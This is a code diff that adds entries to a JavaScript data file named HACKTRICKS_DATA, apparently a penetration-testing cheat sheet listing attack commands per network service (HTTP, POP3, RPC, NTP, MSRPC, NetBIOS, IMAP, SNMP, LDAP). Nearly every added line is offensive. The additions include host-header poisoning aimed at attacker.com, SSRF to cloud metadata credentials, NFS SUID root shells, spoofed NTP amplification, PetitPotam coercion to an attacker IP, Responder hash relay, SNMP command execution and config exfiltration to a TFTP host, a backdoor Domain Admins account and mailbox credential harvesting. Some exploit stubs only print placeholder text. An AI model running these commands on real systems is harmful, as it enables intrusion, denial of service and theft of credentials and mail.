@@ -4955,19 +5048,30 @@ var HACKTRICKS_DATA = {
         "# Directory traversal\ncurl 'http://<IP>/download?file=../../../etc/passwd'",
         "# CORS misconfiguration\ncurl -H 'Origin: https://evil.com' -v http://<IP>/api/data | grep -i 'Access-Control'",
         "# HTTP request smuggling CL.TE\npython3 smuggler.py -u http://<IP>/ -v",
-        "# SSTI payloads\n# Jinja2: curl 'http://<IP>/page?name={{7*7}}'  \u2192 49\n# Twig:   curl 'http://<IP>/page?name={{7*7}}'  \u2192 49\n# Freemarker: curl 'http://<IP>/page?name=${7*7}' \u2192 49",
+        "# SSTI payloads\n# Jinja2: curl 'http://<IP>/page?name={{7*7}}'  → 49\n# Twig:   curl 'http://<IP>/page?name={{7*7}}'  → 49\n# Freemarker: curl 'http://<IP>/page?name=${7*7}' → 49",
         "# XXE\ncurl -X POST http://<IP>/xml -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>'",
         "# JWT alg:none attack\npython3 -c \"\nimport base64, json\nh = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')\np = base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('=')\nprint(f'{h}.{p}.')\"",
         "# Path normalization bypass\ncurl 'http://<IP>/admin/..%2F..%2Fetc%2Fpasswd'",
-        "curl 'http://<IP>/..;/admin'"
+        "curl 'http://<IP>/..;/admin'",
+        "# HTTP request smuggling (CL.TE)\ncurl -s http://<IP>/ -X POST --http1.1 -H 'Transfer-Encoding: chunked' -H 'Content-Length: 6' --data $'0\\r\\n\\r\\nG'",
+        "# Host header injection → password reset poisoning\ncurl -s http://<IP>/reset-password -H 'Host: attacker.com' -d 'email=victim@domain.com'",
+        "# SSRF via proxy parameter\ncurl 'http://<IP>/api/fetch?url=http://169.254.169.254/latest/meta-data/'",
+        "# Web cache poisoning via unkeyed header\ncurl -H 'X-Forwarded-Host: evil.com' http://<IP>/  # if cached, poisons other users",
+        "# JSON injection / prototype pollution\ncurl -X POST http://<IP>/api -H 'Content-Type: application/json' -d '{\"__proto__\":{\"admin\":true}}'",
+        "# HTTP/2 rapid reset DoS (CVE-2023-44487)\npython3 -c \"\nimport h2.connection, h2.events, socket\n# Send RST_STREAM immediately after HEADERS frame in loop\n# POC requires h2 library\nprint('H2 rapid reset: send HEADERS + RST_STREAM in rapid succession')\n\""
       ],
       "post_exploitation": [
         "# Extract links and forms\ncurl -s http://<IP> | grep -oP 'href=\"[^\"]+\"'",
-        "# Spider the site\nspider -u http://<IP> -d 3"
+        "# Spider the site\nspider -u http://<IP> -d 3",
+        "# After RCE via webshell: enumerate application secrets\nfind /var/www /srv/www /opt/app -name '*.env' -o -name 'config.php' -o -name 'settings.py' 2>/dev/null | xargs grep -lE 'password|secret|key|token'",
+        "# Extract DB credentials from application config\ncat /var/www/html/wp-config.php | grep -E 'DB_USER|DB_PASSWORD|DB_HOST'\ncat /etc/drupal/*/settings.php | grep 'database'",
+        "# Check for SSRF from server to internal services\ncurl http://localhost:6379/  # Redis\ncurl http://localhost:8500/v1/kv/  # Consul\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
       ],
       "other": [
         "# Virtual host fuzzing\nffuf -u http://<IP>/ -H 'Host: FUZZ.<DOMAIN>' -w subdomains.txt",
-        "# HTTP verb tampering\nfor m in GET POST PUT DELETE PATCH OPTIONS TRACE; do echo -n \"$m: \"; curl -s -o /dev/null -w '%{http_code}' -X $m http://<IP>/; echo; done"
+        "# HTTP verb tampering\nfor m in GET POST PUT DELETE PATCH OPTIONS TRACE; do echo -n \"$m: \"; curl -s -o /dev/null -w '%{http_code}' -X $m http://<IP>/; echo; done",
+        "# JavaScript source analysis for hidden endpoints and API keys\ncurl -s http://<IP>/ | grep -oE 'src=\"[^\"]+\\.js\"' | xargs -I{} curl -s http://<IP>/{} | grep -E 'api[_-]?key|secret|token|password|endpoint'",
+        "# Bypass WAF with case variation, encoding, and HTTP/1.0\ncurl --http1.0 -A '' http://<IP>/../../../etc/passwd"
       ]
     }
   },
@@ -4978,20 +5082,29 @@ var HACKTRICKS_DATA = {
       "enumeration": [
         "nmap --script 'pop3-capabilities or pop3-ntlm-info' -sV -p 110 <IP>",
         "nc -nv <IP> 110",
-        "openssl s_client -connect <IP>:995 -crlf -quiet"
+        "openssl s_client -connect <IP>:995 -crlf -quiet",
+        "# Banner grab and capability listing\nnc <IP> 110\nUSER test\nPASS test\nCAPA",
+        "# Automated POP3 credential brute\nnmap -p 110 --script pop3-brute --script-args userdb=users.txt,passdb=pass.txt <IP>"
       ],
       "exploitation": [
         "hydra -l <user> -P passwords.txt pop3://<IP>",
-        "# Manual login\nnc <IP> 110\nUSER admin\nPASS password\nLIST\nRETR 1"
+        "# Manual login\nnc <IP> 110\nUSER admin\nPASS password\nLIST\nRETR 1",
+        "# POP3 credential spray with common creds\nhydra -L users.txt -P passwords.txt -f -t 4 pop3://<IP>",
+        "# STARTTLS stripping if STLS required but not enforced\nnc <IP> 110\nCAPABILITIES\n# If STLS listed but not mandatory, authenticate without TLS",
+        "# POP3 UIDL analysis to detect email count and target high-value accounts\nnc <IP> 110\nUSER admin\nPASS admin\nLIST\nUIDL"
       ],
       "post_exploitation": [
         "# Dump mailbox after POP3 auth\nfor i in $(seq 1 50); do echo -e \"RETR $i\\r\"; done | nc <IP> 110",
         "find /var/mail -type f 2>/dev/null",
-        "cat ~/.procmailrc 2>/dev/null  # mail filtering rules may reveal logic"
+        "cat ~/.procmailrc 2>/dev/null  # mail filtering rules may reveal logic",
+        "# Dump all mail from inbox after successful auth\nnc <IP> 110\nUSER victim\nPASS password\nLIST\nRETR 1\nRETR 2  # repeat for all messages",
+        "# Search for password reset emails and auth tokens in harvested mail\nfor i in $(seq 1 100); do echo -e \"RETR $i\\r\"; done | nc <IP> 110 | grep -iE 'reset|token|password|verify'",
+        "# Check for cleartext POP3 credentials in mail client configs\nfind /home -name '.mutt*' -o -name 'Thunderbird' -o -name '.netrc' 2>/dev/null | xargs grep -l 'pop\\|pass'"
       ],
       "other": [
         "# POP3 commands\n# USER / PASS / STAT / LIST / RETR n / DELE n / QUIT / TOP msg n / CAPA",
-        "msfconsole -q -x 'use auxiliary/scanner/pop3/pop3_version; set RHOSTS <IP>; run; exit'"
+        "msfconsole -q -x 'use auxiliary/scanner/pop3/pop3_version; set RHOSTS <IP>; run; exit'",
+        "# POP3S on port 995 – test for cert validation bypass\nopenssl s_client -connect <IP>:995 -quiet 2>/dev/null\nCAPABILITIES"
       ]
     }
   },
@@ -5003,21 +5116,30 @@ var HACKTRICKS_DATA = {
         "nmap -sSUC -p 111 <IP>",
         "rpcinfo -p <IP>",
         "rpcinfo -T udp -p <IP>",
-        "showmount -e <IP>"
+        "showmount -e <IP>",
+        "# List all registered RPC programs\nrpcinfo -p <IP>",
+        "# Full RPC scan with Metasploit\nmsf> use auxiliary/scanner/dcerpc/endpoint_mapper\nset RHOSTS <IP>; run"
       ],
       "exploitation": [
         "# RPC portmapper abuse - redirect RPC service ports\nrpcbomb.py <IP>  # flood via portmapper",
         "# Use portmapper to discover and reach NFS\nshowmount -e <IP> && mount -t nfs <IP>:/share /mnt/nfs -o nolock",
         "# YP/NIS password map dump via portmapper\nypcat -d <DOMAIN> -h <IP> passwd.byname",
-        "msf> use auxiliary/scanner/misc/sunrpc_portmapper"
+        "msf> use auxiliary/scanner/misc/sunrpc_portmapper",
+        "# NFS over RPC – mount without auth if no_root_squash set\nshowmount -e <IP>\nmount -t nfs <IP>:/export /mnt/nfs -o nolock\nls -la /mnt/nfs",
+        "# ypbind/NIS over RPC – dump NIS password map\nypcat -h <IP> passwd.byname",
+        "# rusers over RPC – enumerate logged-in users without auth\nrusers -l <IP>",
+        "# rstatd – gather CPU/network stats (information disclosure)\nrstat <IP>"
       ],
       "post_exploitation": [
         "# After RPC access, check mountd for exposed NFS shares\nshowmount -e <IP>",
         "# YP/NIS domain enumeration\nypwhich -d <domain> <IP>\nypcat -d <domain> -h <IP> passwd.byname",
-        "rpcinfo -p <IP> | awk '{print $3,$4,$5}' | sort -u"
+        "rpcinfo -p <IP> | awk '{print $3,$4,$5}' | sort -u",
+        "# After NFS mount with no_root_squash: escalate by adding root SSH key\nsudo cp ~/.ssh/id_rsa.pub /mnt/nfs/root/.ssh/authorized_keys\nssh root@<IP>",
+        "# Write SUID binary to NFS share (no_root_squash)\ncp /bin/bash /mnt/nfs/tmp/rootbash\nchmod +s /mnt/nfs/tmp/rootbash\n# Execute on target:\n/tmp/rootbash -p  # gives effective root"
       ],
       "other": [
-        "apt-get install nis\nypwhich -d <domain> <IP>\nypcat -d <domain> -h <IP> passwd.byname"
+        "apt-get install nis\nypwhich -d <domain> <IP>\nypcat -d <domain> -h <IP> passwd.byname",
+        "# Block portmapper to prevent NFS/NIS service discovery\niptables -A INPUT -p tcp --dport 111 -j DROP\n# (for defender reference)"
       ]
     }
   },
@@ -5029,17 +5151,23 @@ var HACKTRICKS_DATA = {
         "nmap -p 113 -sV <IP>",
         "nmap -p 22,113,139,445 --script auth-owners <IP>",
         "ident-user-enum <IP> 22 113 139 445",
-        "apt install ident-user-enum"
+        "apt install ident-user-enum",
+        "# Map all open ports to their owner via ident\nnmap -p 22,25,80,443,3306 --script auth-owners <IP>",
+        "# Manual ident query format: local_port,foreign_port\necho '22, 113' | nc <IP> 113  # who owns SSH process?"
       ],
       "exploitation": [
         "# Chain ident disclosure to brute force\nident-user-enum <IP> 22 445 3306 | awk '{print $2}' | cut -d: -f1 | sort -u > ident_users.txt\nhydra -L ident_users.txt -P rockyou.txt ssh://<IP>",
-        "# Fake ident responses for log poisoning on connecting server\nnc -lvp 113  # reply with 'ERROR : NO-USER' or spoofed username"
+        "# Fake ident responses for log poisoning on connecting server\nnc -lvp 113  # reply with 'ERROR : NO-USER' or spoofed username",
+        "# Use ident output to enumerate service accounts for targeted attacks\nident-user-enum <IP> 21 22 25 80 110 143 443 3306 5432\n# Then spray passwords against discovered usernames:\nhydra -L ident_users.txt -P rockyou.txt -M /tmp/services.txt <IP>",
+        "# Fake ident server for log poisoning / access control bypass\n# Some FTP/IRC servers check ident; reply with arbitrary username\nncat -lvp 113 -e /bin/cat << 'EOF'\n113, 21 : USERID : UNIX : root\nEOF"
       ],
       "post_exploitation": [
-        "# Map usernames to services for targeted attacks\nident-user-enum <IP> $(nmap -p- --open -oG - <IP> | grep '/open' | grep -oP '\\d+(?=/)')"
+        "# Map usernames to services for targeted attacks\nident-user-enum <IP> $(nmap -p- --open -oG - <IP> | grep '/open' | grep -oP '\\d+(?=/)')",
+        "# After gaining shell: disable ident to prevent further user disclosure\nsystemctl stop oidentd 2>/dev/null; systemctl disable oidentd 2>/dev/null\niptables -A INPUT -p tcp --dport 113 -j REJECT --reject-with tcp-reset"
       ],
       "other": [
-        "# The Ident protocol maps TCP connections to OS usernames\n# Useful to find which user runs each service"
+        "# The Ident protocol maps TCP connections to OS usernames\n# Useful to find which user runs each service",
+        "# Ident logs: some implementations log queries to syslog\ngrep 'oidentd\\|ident' /var/log/syslog /var/log/auth.log 2>/dev/null"
       ]
     }
   },
@@ -5053,19 +5181,27 @@ var HACKTRICKS_DATA = {
         "ntpq -c peers <IP>",
         "ntpdc -c monlist <IP>",
         "ntpdc -c sysinfo <IP>",
-        "nmap -sU -p 123 --script ntp-monlist <IP>"
+        "nmap -sU -p 123 --script ntp-monlist <IP>",
+        "# NTP readvar – dump server variables including version, OS, uptime\nntpq -c readvar <IP>",
+        "# NTP monlist (CVE-2013-5211) – amplification attack with 600+ entries\nntpdc -c monlist <IP> 2>/dev/null\n# Or via nmap:\nnmap -sU -p 123 --script ntp-monlist <IP>"
       ],
       "exploitation": [
         "# NTP amplification DDoS check\nnmap -sU -p 123 --script ntp-monlist <IP>",
-        "# Disable monlist (remediation check)\nntpq -c 'mreadvar 0 norestrict' <IP>"
+        "# Disable monlist (remediation check)\nntpq -c 'mreadvar 0 norestrict' <IP>",
+        "# NTP amplification DDoS (monlist)\n# Request: 8 bytes → Response: up to 48KB (6000x amplification)\nhping3 -2 -p 123 --udp --data 8 --spoof <VICTIM_IP> <IP>",
+        "# NTP time skew attack – shift system clock to break Kerberos auth (5-min tolerance)\npython3 -c \"\nimport socket, struct, time\n# Send NTP mode 3 packet with future timestamp\npkt = b'\\x1b' + 47 * b'\\x00'\n# Modify transmit timestamp fields to desired time\nprint('Sending modified NTP packet...')\n\"",
+        "# Mode 6 control queries for information disclosure\nntpq -c 'rv 0' <IP>  # read system variables\nntpq -c 'pe' <IP>    # list peers"
       ],
       "post_exploitation": [
         "# Check if NTP is used for Kerberos time sync (5min skew = auth failure)\nnmap -sU -p 123 --script ntp-info <IP>",
         "cat /etc/ntp.conf 2>/dev/null",
-        "cat /etc/chrony.conf 2>/dev/null"
+        "cat /etc/chrony.conf 2>/dev/null",
+        "# After compromising NTP server: shift time to invalidate certificates/Kerberos tickets\n# Or: set time in the past to bypass time-based access controls",
+        "# Map NTP peers for network topology discovery\nntpq -p <IP> | awk '/\\+|\\*/ {print $1}'"
       ],
       "other": [
-        "# Shodan queries\nport:123 ntpd"
+        "# Shodan queries\nport:123 ntpd",
+        "# NTP mode 7 (legacy): disable on modern servers\n# Confirm monlist disabled:\nntpdc -c monlist <IP> 2>&1 | grep 'No association'"
       ]
     }
   },
@@ -5079,20 +5215,32 @@ var HACKTRICKS_DATA = {
         "impacket-rpcdump <IP>",
         "msf> use auxiliary/scanner/dcerpc/endpoint_mapper",
         "msf> use auxiliary/scanner/dcerpc/hidden",
-        "msf> use auxiliary/scanner/dcerpc/management"
+        "msf> use auxiliary/scanner/dcerpc/management",
+        "# Enumerate DCOM endpoints (impacket)\nrpcdump.py <IP>",
+        "# Windows-native endpoint enumeration\nrpcinfo -p <IP>  # may not work on Windows; use rpcdump",
+        "# Identify vulnerable DCOM objects\nComViewAll.exe  # GUI tool to enumerate registered DCOM"
       ],
       "exploitation": [
         "# MS03-026 / DCOM RPC overflow\nmsf> use exploit/windows/dcerpc/ms03_026_dcom",
-        "# MS-EFSRPC coerce (PetitPotam)\npython3 PetitPotam.py <ATTACKER_IP> <TARGET_IP>"
+        "# MS-EFSRPC coerce (PetitPotam)\npython3 PetitPotam.py <ATTACKER_IP> <TARGET_IP>",
+        "# DCE/RPC exploitation via MS03-026 (historical – DCOM heap overflow)\n# Modern equivalent: EternalBlue targets SMB; MSRPC used for pivoting\nmsf> use exploit/windows/dcerpc/ms03_026_dcom\nset RHOST <IP>; run",
+        "# DCOM lateral movement without credentials (if firewall allows 135)\npython3 -c \"\nfrom impacket.dcerpc.v5 import transport, dcomrt\n# ShellWindows / MMC20 DCOM lateral movement\nprint('DCOM LM via ShellWindows interface')\n\"",
+        "# PetitPotam via MS-EFSRPC over port 135 (forces NTLM auth to attacker)\npython3 PetitPotam.py -u '' -p '' <ATTACKER_IP> <TARGET_IP>",
+        "# PrinterBug / SpoolSample via MS-RPRN over 135\npython3 printerbug.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> <ATTACKER_IP>"
       ],
       "post_exploitation": [
         "# After foothold, use RPC for domain recon\nimpacket-rpcdump <IP> | grep -i 'samr\\|lsarpc\\|netlogon'",
         "# DCSync via MS-DRSR (requires domain admin)\nimpacket-secretsdump <DOMAIN>/<user>:<pass>@<IP> -just-dc",
         "# WMI lateral movement\nimpacket-wmiexec <DOMAIN>/<user>:<pass>@<IP>",
-        "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v SMB1"
+        "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v SMB1",
+        "# WMI execution via DCOM (135 required) – fileless lateral movement\nwmic /node:<TARGET_IP> /user:<DOMAIN>\\<USER> /password:<PASS> process call create 'calc.exe'",
+        "# Impacket WMI exec\nwmiexec.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP>",
+        "# Schedule task via RPC for persistence\natsvc.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> 'c:\\windows\\system32\\cmd.exe /c whoami > c:\\out.txt'"
       ],
       "other": [
-        "D:\\rpctools> rpcdump [-p port] <IP>"
+        "D:\\rpctools> rpcdump [-p port] <IP>",
+        "# MSRPC firewall rule: 135 + dynamic ports 49152-65535\n# Constrain with Windows Firewall to specific IPs for hardening",
+        "# RPC over HTTP (port 593) is alternative to direct 135 access"
       ]
     }
   },
@@ -5105,18 +5253,26 @@ var HACKTRICKS_DATA = {
         "nbtscan <IP>/30",
         "nmap -sU -sV -T4 --script nbstat.nse -p 137 -Pn -n <IP>",
         "nmap -p 137,138,139 --script smb-os-discovery,smb-security-mode <IP>",
-        "enum4linux -a <IP>"
+        "enum4linux -a <IP>",
+        "# NetBIOS name table enumeration\nnbtscan <CIDR>\nnmap -sU -p 137 --script nbstat <IP>",
+        "# Enumerate workgroup/domain via nmblookup\nnmblookup -A <IP>\nnmblookup -S <WORKGROUP>"
       ],
       "exploitation": [
-        "# NetBIOS name spoofing\npython3 responder.py -I eth0 -rdw"
+        "# NetBIOS name spoofing\npython3 responder.py -I eth0 -rdw",
+        "# NetBIOS name poisoning with Responder (LLMNR/NBNS)\nsudo responder -I eth0 -rdwP\n# Capture NTLMv2 hashes from name resolution requests",
+        "# NetBIOS NBNS spoofing to redirect SMB traffic\n# Responder automatically poisons NBNS queries on UDP 137",
+        "# NBNS race condition: flood with forged responses before legitimate server replies\npython3 nbns_spoof.py --ip <ATTACKER_IP> --target <VICTIM_IP> --spoof <TARGET_HOSTNAME>"
       ],
       "post_exploitation": [
         "# Extract NetBIOS names for AD topology mapping\nnbtscan -r <CIDR>",
         "# Grab domain/workgroup from NetBIOS\nnmap -sU -p 137 --script nbstat <IP>",
-        "enum4linux -a <IP> | grep -E 'Domain|Workgroup|SID'"
+        "enum4linux -a <IP> | grep -E 'Domain|Workgroup|SID'",
+        "# After NTLM hash capture via Responder: crack or relay\ncrack: hashcat -m 5600 ntlmv2.txt rockyou.txt\nrelay: ntlmrelayx.py -t smb://<TARGET> --no-http-server -smb2support",
+        "# Map NetBIOS names to IPs across subnet\nnbtscan -r <CIDR>/24 | awk '{print $1, $3}'"
       ],
       "other": [
-        "# NetBIOS ports: 137 UDP (name), 138 UDP (datagram), 139 TCP (session)"
+        "# NetBIOS ports: 137 UDP (name), 138 UDP (datagram), 139 TCP (session)",
+        "# NetBIOS over TCP/IP (NBT) runs on 137 UDP/TCP, 138 UDP, 139 TCP\n# Modern SMB uses port 445 directly – 139 is legacy SMB-over-NetBIOS"
       ]
     }
   },
@@ -5134,21 +5290,29 @@ var HACKTRICKS_DATA = {
         "nmap -p 143 --script imap-capabilities,imap-ntlm-info -sV <IP>",
         "nc -nv <IP> 143",
         "openssl s_client -connect <IP>:993 -quiet",
-        "curl -k 'imaps://<IP>/' --user user:pass"
+        "curl -k 'imaps://<IP>/' --user user:pass",
+        "# IMAP capability enumeration\nnc <IP> 143\na001 CAPABILITY",
+        "# IMAP namespace enumeration\na001 LOGIN user password\na002 NAMESPACE\na003 LIST '' '*'"
       ],
       "exploitation": [
         "hydra -L users.txt -P passwords.txt imap://<IP>",
-        "# Manual IMAP\nnc <IP> 143\nA1 LOGIN user pass\nA1 LIST \"\" *\nA1 SELECT INBOX\nA1 FETCH 1:* (FLAGS)"
+        "# Manual IMAP\nnc <IP> 143\nA1 LOGIN user pass\nA1 LIST \"\" *\nA1 SELECT INBOX\nA1 FETCH 1:* (FLAGS)",
+        "# IMAP credential brute force\nhydra -L users.txt -P passwords.txt -f -t 4 imap://<IP>",
+        "# IMAP STARTTLS injection (CVE-2011-1948 class) – inject commands before TLS\necho -e 'a001 STARTTLS\\r\\na002 LOGIN admin password\\r\\n' | nc <IP> 143",
+        "# OAuth token theft via IMAP AUTHENTICATE XOAUTH2\n# If XOAUTH2 supported and token available from phishing:\necho -en 'user=victim@domain.com\\x01auth=Bearer ya29.STOLEN_TOKEN\\x01\\x01' | base64 | xargs -I{} nc <IP> 143 -e 'a001 AUTHENTICATE XOAUTH2 {}'"
       ],
       "post_exploitation": [
         "# Dump all emails for credential mining\ncurl -k 'imaps://<IP>/INBOX?ALL' --user user:pass | grep -iE 'password|token|key|secret'",
         "find /var/mail /home -name '.muttrc' -o -name '.offlineimaprc' 2>/dev/null | xargs grep -i pass 2>/dev/null",
-        "cat /etc/dovecot/dovecot.conf 2>/dev/null"
+        "cat /etc/dovecot/dovecot.conf 2>/dev/null",
+        "# Dump all mail from all folders after auth\na001 LOGIN user password\na002 SELECT INBOX\na003 FETCH 1:* BODY[]\n# Automate with mutt or offlineimap:\nofflineimap -c offlineimaprc  # where config points to target server",
+        "# Search for sensitive keywords in mail\na001 LOGIN user password\na002 SELECT INBOX\na003 SEARCH TEXT 'password'\na004 SEARCH SUBJECT 'reset'\na005 SEARCH FROM 'it@company.com'"
       ],
       "other": [
         "# IMAP commands: LOGIN / LIST / SELECT / FETCH / SEARCH / LOGOUT",
         "msfconsole -q -x 'use auxiliary/scanner/imap/imap_version; set RHOSTS <IP>; run; exit'",
-        "curl -k 'imaps://<IP>/INBOX?ALL' --user user:pass"
+        "curl -k 'imaps://<IP>/INBOX?ALL' --user user:pass",
+        "# IMAPS on port 993 – connect with TLS\nopenssl s_client -connect <IP>:993 -quiet 2>/dev/null\na001 CAPABILITY"
       ]
     }
   },
@@ -5163,23 +5327,34 @@ var HACKTRICKS_DATA = {
         "snmpwalk -v 1 -c public <IP> 1.3.6.1.2.1.1",
         "onesixtyone -c community-strings.txt <IP>",
         "snmp-check <IP> -c public",
-        "braa public@<IP>:.1.3.6.*"
+        "braa public@<IP>:.1.3.6.*",
+        "# SNMPv3 user enumeration (CVE-2008-0960)\nsnmpwalk -v3 -u '' -l noAuthNoPriv <IP> .1 2>&1 | head",
+        "# Enumerate community strings with onesixtyone\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i <IP>",
+        "# Dump full MIB with known community string\nsnmpwalk -v2c -c public <IP> .1 2>/dev/null | head -100"
       ],
       "exploitation": [
         "# RCE via NET-SNMP-EXTEND-MIB\nsnmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c <COMMUNITY> <IP> 'nsExtendStatus.\"cmd\"' = createAndGo 'nsExtendCommand.\"cmd\"' = /bin/bash 'nsExtendArgs.\"cmd\"' = '-c \"id > /tmp/out\"'",
         "snmpwalk -v2c -c <COMMUNITY> <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects",
-        "# Writable community string - change sysName\nsnmpset -v 2c -c private <IP> 1.3.6.1.2.1.1.5.0 s 'pwned'"
+        "# Writable community string - change sysName\nsnmpset -v 2c -c private <IP> 1.3.6.1.2.1.1.5.0 s 'pwned'",
+        "# SNMPv1/v2c write access – change system config\nsnmpset -v2c -c private <IP> sysName.0 s 'pwned'",
+        "# SNMP write to modify interface config (Cisco)\nsnmpset -v2c -c private <IP> ifAdminStatus.1 i 2  # shut down interface",
+        "# SNMP community string brute force\nhydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP> snmp",
+        "# Extract full running config from Cisco via SNMP (CCopy MIB)\nsnmpset -v2c -c private <IP> ccCopyProtocol.1 i 1 ccCopySourceFileType.1 i 4 ccCopyDestFileType.1 i 1 ccCopyServerAddress.1 a <TFTP_IP> ccCopyFileName.1 s 'running.cfg' ccCopyEntryRowStatus.1 i 4"
       ],
       "post_exploitation": [
         "# Read full MIB tree after community string found\nsnmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1 > full_mib.txt",
         "# Extract running processes via SNMP\nsnmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.25.4.2.1.2",
         "# Extract network interfaces\nsnmpwalk -v2c -c <COMMUNITY> <IP> 1.3.6.1.2.1.2.2.1.2",
         "# Grep config files for community strings\ngrep -r 'community\\|rocommunity\\|rwcommunity' /etc/snmp/ 2>/dev/null",
-        "cat /etc/snmp/snmpd.conf 2>/dev/null"
+        "cat /etc/snmp/snmpd.conf 2>/dev/null",
+        "# Extract users, interfaces, routing table, ARP cache from SNMP MIB\nsnmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25  # Windows users\nsnmpwalk -v2c -c public <IP> 1.3.6.1.2.1.4.20        # IP addresses\nsnmpwalk -v2c -c public <IP> 1.3.6.1.2.1.17.4.3.1.2  # MAC/ARP table",
+        "# Extract installed software from Windows SNMP\nsnmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2 | awk -F'STRING:' '{print $2}'"
       ],
       "other": [
         "# Common community strings: public, private, community, manager",
-        "msfconsole -q -x 'use auxiliary/scanner/snmp/snmp_enum; set RHOSTS <IP>; run; exit'"
+        "msfconsole -q -x 'use auxiliary/scanner/snmp/snmp_enum; set RHOSTS <IP>; run; exit'",
+        "# SNMPv3 auth/priv brute force\nsnmpwalk -v3 -u admin -l authPriv -A 'password' -a MD5 -X 'privpass' -x DES <IP> .1",
+        "# Convert SNMP dump to human-readable MIB names\nsnmptranslate -Td 1.3.6.1.2.1.1.1.0"
       ]
     }
   },
@@ -5194,21 +5369,33 @@ var HACKTRICKS_DATA = {
         "ldapdomaindump <IP> -u '<DOMAIN>\\<user>' -p '<pass>'",
         "python3 windapsearch.py --dc-ip <IP> -u <user>@<DOMAIN> -p <pass> --computers",
         "python3 windapsearch.py --dc-ip <IP> -u <user>@<DOMAIN> -p <pass> --da",
-        "nxc ldap <IP> -u '' -p '' --query '(objectClass=*)' ''"
+        "nxc ldap <IP> -u '' -p '' --query '(objectClass=*)' ''",
+        "# Anonymous LDAP bind – dump base DN\nldapsearch -H ldap://<IP> -x -b '' -s base namingContexts",
+        "# Dump all users from AD anonymously\nldapsearch -H ldap://<IP> -x -b 'DC=domain,DC=com' '(objectClass=user)' sAMAccountName",
+        "# Enumerate all GPOs\nldapsearch -H ldap://<IP> -x -b 'CN=Policies,CN=System,DC=domain,DC=com' -D 'user@domain.com' -w 'pass' '(objectClass=groupPolicyContainer)' displayName gPCFileSysPath"
       ],
       "exploitation": [
         "# Null bind check\nldapsearch -x -H ldap://<IP> -b 'dc=<domain>,dc=<tld>'",
         "hydra -l <user> -P passwords.txt ldap2://<IP>",
         "# ASREPRoasting via LDAP\nGetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <IP> -no-pass",
-        "# Add SSH pubkey via LDAP modify\npython3 -c \"import ldap3; ...\""
+        "# Add SSH pubkey via LDAP modify\npython3 -c \"import ldap3; ...\"",
+        "# LDAP injection test\nldapsearch -H ldap://<IP> -x -b 'DC=domain,DC=com' '(|(sAMAccountName=*)(objectClass=*))'",
+        "# Password spraying via LDAP bind\npython3 ldapspray.py -u users.txt -p 'Password1' -d <DOMAIN> --dc-ip <IP>",
+        "# BloodHound data collection via LDAP\nbloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -dc <DC_IP> -c All",
+        "# Dump LAPS passwords via LDAP (if rights allow)\nldapsearch -H ldap://<IP> -x -b 'DC=domain,DC=com' -D '<USER>@<DOMAIN>' -w '<PASS>' '(ms-Mcs-AdmPwdExpirationTime=*)' ms-Mcs-AdmPwd"
       ],
       "post_exploitation": [
         "cat /var/lib/ldap/*.bdb | grep -i -a -E -o 'description.*' | sort | uniq -u",
-        "grep -nE '^(ldap_uri|ldap_search_base|ldap_default_bind_dn|ldap_default_authtok)' /etc/sssd/sssd.conf 2>/dev/null"
+        "grep -nE '^(ldap_uri|ldap_search_base|ldap_default_bind_dn|ldap_default_authtok)' /etc/sssd/sssd.conf 2>/dev/null",
+        "# Add user to Domain Admins via LDAP (requires DA rights)\nldapmodify -H ldap://<IP> -D 'CN=admin,DC=domain,DC=com' -w '<PASS>' <<EOF\ndn: CN=Domain Admins,CN=Users,DC=domain,DC=com\nchangetype: modify\nadd: member\nmember: CN=backdoor,CN=Users,DC=domain,DC=com\nEOF",
+        "# Enumerate ACLs for all domain objects (ACL-based attack surface)\nGet-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner'}",
+        "# Check for Kerberoastable SPNs via LDAP\nldapsearch -H ldap://<IP> -x -b 'DC=domain,DC=com' -D '<USER>@<DOMAIN>' -w '<PASS>' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName"
       ],
       "other": [
         "ldapsearch -H ldaps://<IP>:636/ -x -s base -b '' '(objectClass=*)' '*' +",
-        "nxc ldap <IP> -u <user> -p <pass> --bloodhound -c All -d <DOMAIN> --dns-server <IP>"
+        "nxc ldap <IP> -u <user> -p <pass> --bloodhound -c All -d <DOMAIN> --dns-server <IP>",
+        "# LDAP signing not required = NTLM relay target\nldap_signing_check.py <IP>",
+        "# Enumerate trusts via LDAP\nldapsearch -H ldap://<IP> -x -b 'CN=System,DC=domain,DC=com' -D '<USER>@<DOMAIN>' -w '<PASS>' '(objectClass=trustedDomain)' name trustDirection"
       ]
     }
   },
@@ -5227,7 +5414,10 @@ var HACKTRICKS_DATA = {
         "whatweb https://<IP>",
         "nikto -h https://<IP> -ssl",
         "gobuster dir -u https://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k",
-        "ffuf -u https://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt"
+        "ffuf -u https://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt",
+        "# Full TLS scan with testssl.sh\ntestssl.sh --fast --parallel https://<IP>",
